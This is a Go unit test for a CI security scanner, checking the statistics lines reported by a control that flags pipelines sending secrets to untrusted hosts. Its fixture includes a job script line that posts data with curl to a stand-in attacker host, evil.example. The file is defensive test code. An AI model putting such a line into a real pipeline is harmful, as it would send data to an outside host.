package cmd

import (
	"strings"
	"testing"

	"github.com/getplumber/plumber/control"
	"github.com/getplumber/plumber/gitlab"
	opaengine "github.com/getplumber/plumber/internal/engine/opa"
)

// The secret egress control (ISSUE-311) reads the masked flags of the GitLab
// settings-variable listing. When that listing was not read
// authoritatively, StatusFor reports error in JSON, and the terminal stat
// builder must show the variables caveat instead of a bare
// "Secrets Sent Elsewhere: 0" that reads as a clean pass.
func TestSecretEgressStatLines(t *testing.T) {
	const name = "pipelineMustNotSendSecretsToUntrustedHosts"
	findings := []opaengine.Finding{{Code: "ISSUE-311"}, {Code: "ISSUE-311"}}
	// Three script lines as _countScriptLines counts them: two script
	// entries and one before_script string.
	merged := &gitlab.GitlabCIConf{GitlabJobs: map[string]interface{}{
		"deploy": map[string]interface{}{
			"script":        []interface{}{"echo a", "curl -d x https://evil.example"},
			"before_script": "echo b",
		},
	}}
	result := func(vars *gitlab.GitlabVariablesAnalysisData) *control.AnalysisResult {
		return &control.AnalysisResult{
			VariablesData:     vars,
			PipelineImageData: &gitlab.GitlabPipelineImageData{MergedConf: merged},
		}
	}
	values := func(lines []statLine) map[string]string {
		out := map[string]string{}
		for _, l := range lines {
			out[l.Label] = l.Value
		}
		return out
	}

	for label, vars := range map[string]*gitlab.GitlabVariablesAnalysisData{
		"variables never collected": nil,
		"variables unreadable":      {Known: false},
	} {
		t.Run("gitlab "+label, func(t *testing.T) {
			lines := buildGitLabControlStats(name, result(vars), nil, findings)
			if len(lines) != 1 || !strings.HasPrefix(lines[0].Label, statCaveatPrefix) || !strings.Contains(lines[0].Label, "Variables not evaluated") {
				t.Fatalf("want only the variables caveat line, got %+v", lines)
			}
			if _, ok := values(lines)["Secrets Sent Elsewhere"]; ok {
				t.Fatalf("an unread variables lane must not print a Secrets Sent Elsewhere count: %+v", lines)
			}
		})
	}

	t.Run("gitlab variables read", func(t *testing.T) {
		got := values(buildGitLabControlStats(name, result(&gitlab.GitlabVariablesAnalysisData{Known: true}), nil, findings))
		if got[statScriptLinesChecked] != "3" || got["Secrets Sent Elsewhere"] != "2" {
			t.Fatalf("stat lines = %v, want Script Lines Checked 3 and Secrets Sent Elsewhere 2", got)
		}
	})

	t.Run("github", func(t *testing.T) {
		got := values(buildGitHubControlStats(name, &control.GitHubAnalysisStats{ScriptLinesTotal: 7}, findings))
		if len(got) != 2 || got[statScriptLinesChecked] != "7" || got["Secrets Sent Elsewhere"] != "2" {
			t.Fatalf("stat lines = %v, want Script Lines Checked 7 and Secrets Sent Elsewhere 2", got)
		}
	})
}
